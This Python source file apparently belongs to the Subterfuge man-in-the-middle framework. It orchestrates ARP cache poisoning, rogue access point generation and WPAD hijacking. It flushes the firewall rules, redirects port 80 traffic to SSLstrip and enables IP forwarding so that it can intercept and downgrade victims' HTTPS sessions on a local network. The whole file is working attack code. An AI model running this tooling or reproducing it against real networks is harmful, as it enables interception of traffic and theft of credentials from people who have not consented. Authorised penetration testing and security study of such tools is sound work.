import os
import re
import sys
sys.path.append('/usr/share/subterfuge')
import time
  #Ignore Deprication Warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 
    
from django.conf import settings
settings.configure(DATABASE_ENGINE="sqlite3",
                   DATABASE_HOST="",
                   DATABASE_NAME= os.path.dirname(__file__) + "/db",
                   DATABASE_USER="",
                   DATABASE_PASSWORD="")

from django.db import models
from main.models import *
from modules.models import *


def attack(method):
    print "Starting Pwn Ops..."
    
        #Determine Active Vectors
    acp, apgenatk, wpad = getvectors()
    
        #Launch Attacks
        #ARP Cache Poison
    if acp == "yes":
            #Auto Pwn Method
        if (method == "auto"):
            print "Running AutoPwn Method..."
                #AutoConfig
            autoconfig()
            interface, gateway, attackerip, routermac, smartarp = getinfo()
            
                #Begin Attack Setup
            print "Automatically Configuring Subterfuge..."
            iptablesconfig()
            print "Initiating ARP Poison With ARPMITM..."
                #ARP Cache Poison through Subterfuge:
            command = 'python ' + os.path.dirname(os.path.abspath(__file__)) + '/utilities/arpmitm.py ' + gateway + ' &'
            os.system(command)
            print "Starting up SSLstrip..."
            sslstrip()

                #Get & Log Router Mac
            if (os.path.exists(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")):
                f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
                mac = f.readline()
                macaddr = mac.rstrip("\n")
                setup.objects.update(routermac = macaddr)

            #os.system("python " + str(os.path.dirname(__file__)) + "/mitm.py -a &")
                
                 #Check for ARPWatch
            if (smartarp == "yes"):
                 os.system("python " + str(os.path.dirname(__file__)) + "/utilities/arpwatch.py " + gateway + " " + routermac + " " + attackerip + " &")
                
            else:
                print "Encountered an error configuring arpwatch: Router MAC Address Unknown. Terminating..."
            
            #Standard Attack Method
        else:
            interface, gateway, attackerip, routermac, smartarp = getinfo()
            
                #Begin Attack Setup
            print "Automatically Configuring Subterfuge..."
            iptablesconfig()
            print "Initiating ARP Poison With ARPMITM..."
                #ARP Cache Poison through Subterfuge:
            command = 'python ' + os.path.dirname(os.path.abspath(__file__)) + '/utilities/arpmitm.py ' + gateway + ' &'
            os.system(command)
            print "Starting up SSLstrip..."
            sslstrip()
    
                #Get & Log Router Mac
            if (os.path.exists(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")):
                f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
                mac = f.readline()
                macaddr = mac.rstrip("\n")
                setup.objects.update(routermac = macaddr)
                
                #Check for ARPWatch
            if (smartarp == "yes"):
                os.system("python " + str(os.path.dirname(__file__)) + "/utilities/arpwatch.py " + gateway + " " + routermac + " " + attackerip + " &")
                
            else:
                print "Dynamic ARP Retention is disabled."
                
        #Wireless AP Generator
    if apgenatk == "yes":
            #Get Attack Info
        for info in apgen.objects.all():
            essid     = info.essid
            channel   = info.channel
            atknic    = info.atknic
            netnic    = info.netnic
        
        print "Launching Access Point Generation Attack..."
        cmd = "xterm -e sh -c 'python " + str(os.path.dirname(__file__)) + "/utilities/apgen.py " + essid + " " + atknic + " " + netnic + "' &"
        print cmd
        os.system(cmd)
        
            #Begin MITM Attack Setup
        print "Automatically Configuring Subterfuge..."
        iptablesconfig()
        print "Starting up SSLstrip..."
        sslstrip()
        
        #WPAD Hijacking
    if wpad == "yes":
        #Auto Pwn Method
        print "Running AutoPwn Method..."
            #AutoConfig
        autoconfig()
        interface, gateway, attackerip, routermac, smartarp = getinfo()
        
            #Begin MITM Attack Setup
            #Begin Attack Setup
            #No IPTables SSLStrip Configuration necessary for WPAD Hijacking
        #print "Automatically Configuring Subterfuge..."
        #iptablesconfig()
            #Flush IPTables
        print "Flushing IPTables for WPAD Hijacking"
        os.system("iptables -t nat -F")
        print "Starting up SSLstrip..."
        sslstrip()
            #Execute WPAD Hijacking
        os.system("python " + str(os.path.dirname(__file__)) + "/utilities/wpadhijack.py " + gateway + " " + routermac + " " + attackerip + " &")
        
        #Start Up Modules
    modules()
        

def getvectors():
        #Get Attack Vectors
    active = []
    for vector in vectors.objects.all():
        active.append(vector.active)
    
        #Return Active/Inactive
    return active[0], active[1], active[2]

def modules():
        #Check Active
    active = []
    for module in installed.objects.all():
        active.append(module.active)    
            #Deploy Active Vectors
        if module.active == "yes":
            os.system("python " + str(os.path.dirname(__file__)) + "/modules/" + module.name + "/" + module.name + ".py &")
    


def getinfo():
        #Get Globals from Database
    for settings in setup.objects.all():
        interface     = settings.iface
        gateway       = settings.gateway
        attackerip    = settings.ip
        routermac     = settings.routermac
        smartarp      = settings.smartarp
    
    return interface, gateway, attackerip, routermac, smartarp


    #SSLStrip tooled through Subterfuge:
def sslstrip():
    #run sslstrip
    os.system('python ' + os.path.dirname(__file__) + '/sslstrip.py -w ' + os.path.dirname(__file__) + '/sslstrip.log -l 10000 -f &')
    #-a includes all traffic not just https post requests
    

    #Set system configuration to perform MITM Attacks
def iptablesconfig():
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('iptables -t mangle -F')
    os.system('iptables -t mangle -X')
    os.system('iptables -P INPUT ACCEPT')
    os.system('iptables -P FORWARD ACCEPT')
    os.system('iptables -P OUTPUT ACCEPT')
    time.sleep(1)
    os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 	10000')
    time.sleep(1)
    print "Iptables Prerouting Configured\n"
    
    print 'Configuring System...'
    os.system('sysctl -w net.ipv4.ip_forward=1')
    print "IP Forwarding Enabled."

def autoconfig():
          # Read in subterfuge.conf Deprecate for Version 5.0
    with open(str(os.path.dirname(__file__)) + '/subterfuge.conf', 'r') as file:
        conf = file.readlines()
    
        # Get AutoConfiguration Information
        # Get Interfaces
    f = os.popen("ls /sys/class/net/")
    temp = ''
    temp = f.readline().rstrip('\n')
    result = []
    result.append(temp)
    while (temp != ''):
       temp = f.readline().rstrip('\n')
       if (temp != 'lo'):
                result.append(temp)
    result.remove('')
    
        # Get Gateway
    gw = []
    e = os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'")
    ttemp = ''
    ttemp = e.readline().rstrip('\n')
    if not ttemp:
       print 'No default gateway present'
    else:
       gw.append(ttemp)
    temp = ''
    gw.append(temp)
    for interface in result:
       f = os.popen("ifconfig " + interface + " | grep \"inet addr\" | sed -e \'s/.*addr://;s/ .*//\'")
       temp2 = ''
       temp3 = ''
       temp = f.readline().rstrip('\n')
       temp2 = re.findall(r'\d*.\d*.\d*.', temp)
       if not temp2:
          print "No default gw on " + interface
       else:
          gate = temp2[0] + '1'
          gw.append(gate)
          result[0] = interface
          autogate = gw[0]
    gw.remove('')
    gw.reverse()
    
        #Read in Config File Deprecate for Version 5.0
    f = open(str(os.path.dirname(__file__)) + '/subterfuge.conf', 'r')
    conf = f.readlines()
         
        #Get the Local IP Address
    f = os.popen("ifconfig " + result[0] + " | grep \"inet addr\" | sed -e \'s/.*addr://;s/ .*//\'")
    temp2 = ''
    temp3 = ''
    temp = f.readline().rstrip('\n')

    ipaddress = re.findall(r'\d*.\d*.\d*.\d*', temp)[0]
    
        # Edit subterfuge.conf Deprecate for Version 5.0
    print "Using: ", result[0]
    print "Setting gateway as: ", autogate
    conf[17] = autogate + "\n"
    conf[15] = result[0] + "\n"
    conf[26] = ipaddress + "\n"
    
        #Set Database
    setup.objects.update(gateway = autogate)
    setup.objects.update(iface = result[0])
    setup.objects.update(ip = ipaddress) 
    
        # Write to subterfuge.conf Deprecate for Version 5.0
    with open(str(os.path.dirname(__file__)) + '/subterfuge.conf', 'w') as file:
        file.writelines(conf)
        
    #Check Arguments
if len(sys.argv) < 1:
    print "Encountered an error configuring attack: Invalid Arguments. Terminating..."
    exit()
else:
    attack(sys.argv[1])
        
